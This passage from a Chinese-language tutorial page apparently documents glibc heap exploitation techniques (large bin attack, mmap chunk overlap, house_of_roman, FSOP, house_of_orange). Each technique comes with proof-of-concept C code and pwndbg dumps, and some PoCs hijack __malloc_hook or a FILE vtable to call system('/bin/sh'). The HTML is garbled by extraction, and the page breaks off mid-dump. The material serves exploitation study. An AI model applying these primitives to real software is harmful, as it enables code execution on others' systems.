puts(&quot;Exiting...&quot;);                return 1;&#125;large_bin  &#x3D;  malloc ( 0x4d8 ); malloc ( 0x18 );free ( large_bin );  free ( unsorted_bin );unsorted_bin &#x3D; malloc(0x4e8);free(unsorted_bin);fake_chunk &#x3D; target - 0x10;((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; (( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ;ptr &#x3D; malloc(alloc_size);strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>条件：没有地址随机化</p><p>首先创建一个<code>unsorted bin</code>和一个<code>large bin</code>（<code>large bin</code>小于<code>unsorted bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x405290Size: 0x4f1Allocated chunk | PREV_INUSEAddr: 0x405780Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x4057a0Size: 0x4e1Allocated chunk | PREV_INUSEAddr: 0x405c80Size: 0x21Top chunk | PREV_INUSEAddr: 0x405ca0Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放<code>large bin</code>和<code>unsroted bin</code>，再创建一个堆并释放掉使得<code>large bin</code>能够真正进入<code>large bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x291Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405290Size: 0x4f1fd: 0x7ffff7facbe0bk: 0x7ffff7facbe0Allocated chunkAddr: 0x405780Size: 0x20Free chunk (largebins) | PREV_INUSEAddr: 0x4057a0Size: 0x4e1fd: 0x7ffff7fad000bk: 0x7ffff7fad000fd_nextsize: 0x4057a0bk_nextsize: 0x4057a0Allocated chunkAddr: 0x405c80Size: 0x20Top chunk | PREV_INUSEAddr: 0x405ca0Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>unsorted bin</code>的<code>bk</code>改成<code>目标地址 - 0x10</code></p><p>将<code>large bin</code>的<code>bk_nextsize</code>改成<code>目标地址 - 0x28 - shift amount</code>，<code>bk</code>改成<code>目标地址 - 0x8</code></p><p>其中，<code>shift amount</code>计算方式：<code>large bin</code>地址转换为长长整型，每次右移<code>8</code>位知道小于等于<code>0x20</code>，<code>shift amount</code>即为右移次数减<code>1</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x291Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405290Size: 0x4f1fd: 0x7ffff7facbe0bk: 0x404070Allocated chunkAddr: 0x405780Size: 0x20Free chunk (largebins) | PREV_INUSEAddr: 0x4057a0Size: 0x4e1fd: 0x7ffff7fad000bk: 0x404078fd_nextsize: 0x4057a0bk_nextsize: 0x404056Allocated chunkAddr: 0x405c80Size: 0x20Top chunk | PREV_INUSEAddr: 0x405ca0Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再申请出来就可以将目标地址改成一个随机的很大的数字了</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x4040800x404080 &lt;target&gt;:0x00474645444342410x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="mmap-overlapping-chunks-x2F-mmap"><a href="#mmap-overlapping-chunks-x2F-mmap" class="headerlink" title="mmap_overlapping_chunks&#x2F;mmap"></a>mmap_overlapping_chunks&#x2F;mmap</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;assert.h&gt;int main()&#123;int* ptr1 &#x3D; malloc(0x10); long long* top_ptr &#x3D; malloc(0x100000);long long* mmap_chunk_2 &#x3D; malloc(0x100000);long long* mmap_chunk_3 &#x3D; malloc(0x100000);    mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;    free(mmap_chunk_3); long long* overlapping_chunk &#x3D; malloc(0x300000);    int distance &#x3D; mmap_chunk_2 - overlapping_chunk;    overlapping_chunk[distance] &#x3D; 0x1122334455667788;assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对<code>mmap</code>的<code>overlap</code>，原理与<code>overlapping_chunks</code>相同，只是堆的大小在<code>mmap</code>创建的范围</p><p>首先创建了一个<code>0x10</code>的堆和三个<code>0x100000</code>的堆I（<code>heap</code>里看不到</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x405020Size: 0x411Top chunk | PREV_INUSEAddr: 0x405430Size: 0x20bd1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">The first mmap chunk goes directly above LibC: 0x7ffff7ef2010The second mmap chunk goes below LibC: 0x7ffff790c010The third mmap chunk goes below the second mmap chunk: 0x7ffff780b010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到第三个堆地址在第二个之上，所以将第三个堆大小改成二、三两个堆大小之和</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7ffff780b0000x7ffff780b000:0x00000000000000000x00000000002020020x7ffff780b010:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>释放这个堆之后再申请出来(<code>0x300000</code>)</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7ffff770c0000x7ffff770c000:0x00000000000000000x00000000003010020x7ffff770c010:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>则第二个堆可用且第三个堆中第二个堆的部分也可用</p><h3 id="house-of-roman-无show函数"><a href="#house-of-roman-无show函数" class="headerlink" title="house_of_roman(无show函数)"></a>house_of_roman(无show函数)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE    #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;malloc.h&gt;#include &lt;dlfcn.h&gt;char* shell &#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;;void* init()&#123;setvbuf(stdout, NULL, _IONBF, 0);setvbuf(stdin, NULL, _IONBF, 0);&#125;int main()&#123;init();uint8_t* fastbin_victim &#x3D; malloc(0x60); malloc(0x80);uint8_t* main_arena_use &#x3D; malloc(0x80);uint8_t* relative_offset_heap &#x3D; malloc(0x60);free(main_arena_use);uint8_t* fake_libc_chunk &#x3D; malloc(0x60);long long __malloc_hook &#x3D; ((long*)fake_libc_chunk)[0] - 0xe8;free(relative_offset_heap);free(fastbin_victim);fastbin_victim[0] &#x3D; 0x00;     long long __malloc_hook_adjust &#x3D; __malloc_hook - 0x23;     int8_t byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; int8_t byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; fake_libc_chunk[0] &#x3D; byte1;fake_libc_chunk[1] &#x3D; byte2;     malloc(0x60);malloc(0x60);uint8_t* malloc_hook_chunk &#x3D; malloc(0x60);uint8_t* unsorted_bin_ptr &#x3D; malloc(0x80);malloc(0x30);    free(unsorted_bin_ptr);__malloc_hook_adjust &#x3D; __malloc_hook - 0x10;byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; unsorted_bin_ptr[8] &#x3D; byte1;     unsorted_bin_ptr[9] &#x3D; byte2;     malloc(0x80); long long system_addr &#x3D; (long long)dlsym(RTLD_NEXT, &quot;system&quot;);malloc_hook_chunk[19] &#x3D; system_addr &amp; 0xff; malloc_hook_chunk[20] &#x3D; (system_addr &gt;&gt; 8) &amp; 0xff; malloc_hook_chunk[21] &#x3D; (system_addr &gt;&gt; 16) &amp; 0xff;malloc_hook_chunk[22] &#x3D; (system_addr &gt;&gt; 24) &amp; 0xff;     puts(&quot;Pop Shell!&quot;);malloc((long long)shell);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在没有<code>show</code>的情况下要将<code>malloc_hook</code>改成<code>ogg</code>需要通过<code>unsorted bin</code>使得<code>main arena</code>地址进入一个申请出来的堆的<code>fd</code>位置，然后让<code>fast bin</code>里的其他堆指向这个堆，并通过修改低位来改成<code>malloc_hook</code>,再利用<code>unsorted bin attack</code>改<code>malloc_hook</code>为<code>main arena</code>，最后改<code>fast bin</code>中的堆指向的堆为<code>ogg</code>即可将<code>malloc_hook</code>改成<code>ogg</code>，宗旨就是利用堆里的地址改低位为要修改的地址，需要注意<code>2.23</code>对<code>size</code>的检查</p></blockquote><p>先创建4个堆，大小分别为<code>0x60 0x80 0x80 0x60</code>,释放第三个堆进入<code>unsorted bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x71Allocated chunk | PREV_INUSEAddr: 0x405070Size: 0x91Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405100Size: 0x91fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x405190Size: 0x70Top chunk | PREV_INUSEAddr: 0x405200Size: 0x20e01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请比第三个堆小的第五个堆使得它从<code>unsorted bin</code>中切割并且<code>fd</code>中有<code>main arena</code>地址，由此得到<code>malloc_hook</code>地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x71Allocated chunk | PREV_INUSEAddr: 0x405070Size: 0x91Allocated chunk | PREV_INUSEAddr: 0x405100Size: 0x71Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405170Size: 0x21fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x405190Size: 0x70Top chunk | PREV_INUSEAddr: 0x405200Size: 0x20e01pwndbg&gt; x&#x2F;20gx 0x4051000x405100:0x00000000000000000x00000000000000710x405110:0x00007ffff7dd1bf80x00007ffff7dd1bf80x405120:0x00000000000000000x00000000000000000x405130:0x00000000000000000x00000000000000000x405140:0x00000000000000000x00000000000000000x405150:0x00000000000000000x00000000000000000x405160:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前后释放第四个堆和第一个堆，在<code>fast bin</code>中有第一个堆指向第四个堆，高地址便于修改为低地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x405000 —▸ 0x405190 ◂— 0x00x80: 0x0unsortedbinall: 0x405170 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将第一个堆的<code>fd</code>改成第五个堆，即<code>unsorted bin</code>中切割出来的堆，而该堆指向了<code>main arena</code>,再通过相同的方式将第五个堆的<code>fd</code>改成<code>malloc_hook - 0x23</code>（绕过<code>size</code>检测）</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x405000 —▸ 0x405100 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7a92ea00000000x80: 0x0unsortedbinall: 0x405170 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来进行<code>unsorted bin attack</code>，创建大小为<code>0x80</code>的第六个堆，再创建一个堆来防止该堆与<code>top chunk</code>合并，释放第六个堆并把<code>bk</code>修改低位改成<code>malloc_hook - 0x10</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0xfff7a92ea00000000x80: 0x0unsortedbinall [corrupted]FD: 0x405200 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405200BK: 0x405200 —▸ 0x7ffff7dd1b00 (__memalign_hook) ◂— 0x0smallbins0x20: 0x405170 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将这个堆申请出来，此时<code>malloc_hook</code>中的值就被改成了<code>main arena</code>，因为<code>main arena</code>的地址除了低位其他与<code>system</code>相同</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; p __malloc_hook$1 &#x3D; (void *(*)(size_t, const void *)) 0x7ffff7dd1b78 &lt;main_arena+88&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后通过<code>bin</code>里的堆改<code>malloc_hook</code>低位为<code>system</code>即可将<code>malloc_hook</code>改成<code>system</code></p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _IO_list_all 0x7ffff7dd2520#define mode_offset 0xc0#define writeptr_offset 0x28#define writebase_offset 0x20#define vtable_offset 0xd8 int main(void)&#123;    void *ptr;    long long *list_all_ptr;    ptr&#x3D;malloc(0x200);    *(long long*)((long long)ptr+mode_offset)&#x3D;0x0;    *(long long*)((long long)ptr+writeptr_offset)&#x3D;0x1;    *(long long*)((long long)ptr+writebase_offset)&#x3D;0x0;    *(long long*)((long long)ptr+vtable_offset)&#x3D;((long long)ptr+0x100);    *(long long*)((long long)ptr+0x100+24)&#x3D;0x41414141;    list_all_ptr&#x3D;(long long *)_IO_list_all;    list_all_ptr[0]&#x3D;ptr;    exit(0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原理是劫持<code>_IO_list_all</code>，<code>IO_FILE</code>结构体链表通过<code>_chain</code>域连接<code>stderr</code>、<code>stdout</code>、<code>stdin</code>，链表的表头是<code>_IO_list_all</code>，<code>_IO_list_all</code>和<code>vtable</code>链表中各项的偏移如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0x0</span>   _flags<span class="token number">0x8</span>   _IO_read_ptr<span class="token number">0x10</span>  _IO_read_end<span class="token number">0x18</span>  _IO_read_base<span class="token number">0x20</span>  _IO_write_base<span class="token number">0x28</span>  _IO_write_ptr<span class="token number">0x30</span>  _IO_write_end<span class="token number">0x38</span>  _IO_buf_base<span class="token number">0x40</span>  _IO_buf_end<span class="token number">0x48</span>  _IO_save_base<span class="token number">0x50</span>  _IO_backup_base<span class="token number">0x58</span>  _IO_save_end<span class="token number">0x60</span>  _markers<span class="token number">0x68</span>  _chain<span class="token number">0x70</span>  _fileno<span class="token number">0x74</span>  _flags2<span class="token number">0x78</span>  _old_offset<span class="token number">0x80</span>  _cur_column<span class="token number">0x82</span>  _vtable_offset<span class="token number">0x83</span>  _shortbuf<span class="token number">0x88</span>  _lock<span class="token number">0x90</span>  _offset<span class="token number">0x98</span>  _codecvt<span class="token number">0xa0</span>  _wide_data<span class="token number">0xa8</span>  _freeres_list<span class="token number">0xb0</span>  _freeres_buf<span class="token number">0xb8</span>  __pad5<span class="token number">0xc0</span>  _mode<span class="token number">0xc4</span>  _unused2<span class="token number">0xd8</span>  vtable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">0x0   __dummy0x8   __dummy20x10  __finish0x18  __overflow0x20  __underflow0x28  __uflow0x30  __pbackfail0x38  __xsputn0x40  __xsgetn0x48  __seekoff0x50  __seekpos0x58  __setbuf0x60  __sync0x68  __doallocate0x70  __read0x78  __write0x80  __seek0x88  __close0x90  __stat0x98  __showmanyc0xa0  __imbue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p _IO_list_all-&gt;file._chain$2 &#x3D; (struct _IO_FILE *) 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;pwndbg&gt; p _IO_list_all-&gt;file._chain._chain$3 &#x3D; (struct _IO_FILE *) 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;pwndbg&gt; p _IO_list_all-&gt;file._chain._chain._chain$4 &#x3D; (struct _IO_FILE *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>FSOP</code>利用主要是劫持<code>libc</code>中的<code>_IO_list_all</code>的<code>vtable</code>中<code>__overflow</code>函数地址，之后通过调用<code>abort/exit/main</code>来触发<code>_IO_flush_all_lockp</code>用于最终调用<code>_IO_OVERFLOW</code>刷新<code>_IO_list_all</code>链表</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int_IO_flush_all_lockp (int do_lock)&#123;  ...  fp &#x3D; (_IO_FILE *) _IO_list_all;  while (fp !&#x3D; NULL)  &#123;       ...       if (((fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))               &amp;&amp; _IO_OVERFLOW (fp, EOF) &#x3D;&#x3D; EOF)           &#123;               result &#x3D; EOF;          &#125;        ...  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用<code>_IO_OVERFLOW</code>还需要绕过<code>if</code>判断</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">(fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先创建一个堆并在堆中伪造了一个<code>_IO_list_all</code>，满足<code>if</code>中的判断，并且<code>ptr+0x100+24</code>处是<code>_IO_list_all</code>的<code>vtable</code>中的<code>__overflow</code>函数地址，最后改<code>_IO_list_all</code>为伪造的地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all$19 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; 0,    _IO_read_ptr &#x3D; 0x0,    _IO_read_end &#x3D; 0x0,    _IO_read_base &#x3D; 0x0,    _IO_write_base &#x3D; 0x0,    _IO_write_ptr &#x3D; 0x1 &lt;error: Cannot access memory at address 0x1&gt;,    _IO_write_end &#x3D; 0x0,    _IO_buf_base &#x3D; 0x0,    _IO_buf_end &#x3D; 0x0,    _IO_save_base &#x3D; 0x0,    _IO_backup_base &#x3D; 0x0,    _IO_save_end &#x3D; 0x0,    _markers &#x3D; 0x0,    _chain &#x3D; 0x0,    _fileno &#x3D; 0,    _flags2 &#x3D; 0,    _old_offset &#x3D; 0,    _cur_column &#x3D; 0,    _vtable_offset &#x3D; 0 &#39;\000&#39;,    _shortbuf &#x3D; &quot;&quot;,    _lock &#x3D; 0x0,    _offset &#x3D; 0,    _codecvt &#x3D; 0x0,    _wide_data &#x3D; 0x0,    _freeres_list &#x3D; 0x0,    _freeres_buf &#x3D; 0x0,    __pad5 &#x3D; 0,    _mode &#x3D; 0,    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;  &#125;,  vtable &#x3D; 0x405110&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p *_IO_list_all-&gt;vtable$18 &#x3D; &#123;  __dummy &#x3D; 0,  __dummy2 &#x3D; 0,  __finish &#x3D; 0x0,  __overflow &#x3D; 0x41414141,  __underflow &#x3D; 0x0,  __uflow &#x3D; 0x0,  __pbackfail &#x3D; 0x0,  __xsputn &#x3D; 0x0,  __xsgetn &#x3D; 0x0,  __seekoff &#x3D; 0x0,  __seekpos &#x3D; 0x0,  __setbuf &#x3D; 0x0,  __sync &#x3D; 0x0,  __doallocate &#x3D; 0x0,  __read &#x3D; 0x0,  __write &#x3D; 0x0,  __seek &#x3D; 0x0,  __close &#x3D; 0x0,  __stat &#x3D; 0x0,  __showmanyc &#x3D; 0x0,  __imbue &#x3D; 0x0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="house-of-orange-top-chunk-FSOP"><a href="#house-of-orange-top-chunk-FSOP" class="headerlink" title="house_of_orange(top chunk + FSOP)"></a>house_of_orange(top chunk + FSOP)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;syscall.h&gt;int winner ( char *ptr);int main()&#123;    char *p1, *p2;    size_t io_list_all, *top;    p1 &#x3D; malloc(0x400-16);    top &#x3D; (size_t *) ( (char *) p1 + 0x400 - 16);    top[1] &#x3D; 0xc01;        p2 &#x3D; malloc(0x1000);        io_list_all &#x3D; top[2] + 0x9a8;        top[3] &#x3D; io_list_all - 0x10;    memcpy( ( char *) top, &quot;&#x2F;bin&#x2F;sh\x00&quot;, 8);    top[1] &#x3D; 0x61;    FILE *fp &#x3D; (FILE *) top;    fp-&gt;_mode &#x3D; 0; &#x2F;&#x2F; top+0xc0    fp-&gt;_IO_write_base &#x3D; (char *) 2; &#x2F;&#x2F; top+0x20    fp-&gt;_IO_write_ptr &#x3D; (char *) 3; &#x2F;&#x2F; top+0x28    size_t *jump_table &#x3D; &amp;top[12]; &#x2F;&#x2F; controlled memory    jump_table[3] &#x3D; (size_t) &amp;winner;    *(size_t *) ((size_t) fp + sizeof(FILE)) &#x3D; (size_t) jump_table; &#x2F;&#x2F; top+0xd8    malloc(10);    return 0;&#125;int winner(char *ptr)&#123;     system(ptr);    syscall(SYS_exit, 0);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>top_chunk</code>在其他<code>bins</code>不满足的情况下可以进入<code>unsorted bin</code>的特点，但是需要满足条件</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">assert ((old_top &#x3D;&#x3D; initial_top (av) &amp;&amp; old_size &#x3D;&#x3D; 0) ||         ((unsigned long) (old_size) &gt;&#x3D; MINSIZE &amp;&amp;          prev_inuse (old_top) &amp;&amp;          ((unsigned long) old_end &amp; (pagesize - 1)) &#x3D;&#x3D; 0));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>伪造的<code>size</code>必须要对齐到内存页<code>0x400</code>(<code>ptr + size</code>对齐)</p><p><code>size</code> 要大于 <code>MINSIZE(0x10)</code></p><p><code>size</code> 要小于之后申请的 <code>chunk size + MINSIZE(0x10)</code></p><p><code>size</code> 的 <code>prev inuse</code> 位必须为 <code>1</code></p></blockquote><p>先创建一个<code>0x400</code>的堆，申请的大小是<code>0x3f0</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x401Top chunk | PREV_INUSEAddr: 0x405400Size: 0x20c01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着改<code>top chunk</code>大小为<code>0xc01</code>,此时<code>top chunk</code>地址加上大小刚好可以页对齐</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x401Top chunk | PREV_INUSEAddr: 0x405400Size: 0xc01pwndbg&gt; p&#x2F;x 0x405400 + 0xc00$1 &#x3D; 0x406000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时再创建一个<code>0x1000</code>的堆，使得<code>top chunk</code>进入<code>unsorted bin</code>,此时<code>fd</code>和<code>bk</code>中存在<code>libc</code>地址，由此可以计算出<code>_IO_list_all</code>的地址，在此过程中由于申请的堆大于<code>top chunk</code>，所以向系统申请了新的<code>top chunk</code>,地址在旧的<code>top chunk</code>之后，因此旧的<code>top chunk</code>进入了<code>unsorted bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x400 (with flag bits: 0x401)Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405400Size: 0xbe0 (with flag bits: 0xbe1)fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x405fe0Size: 0x10 (with flag bits: 0x10)Allocated chunk | PREV_INUSEAddr: 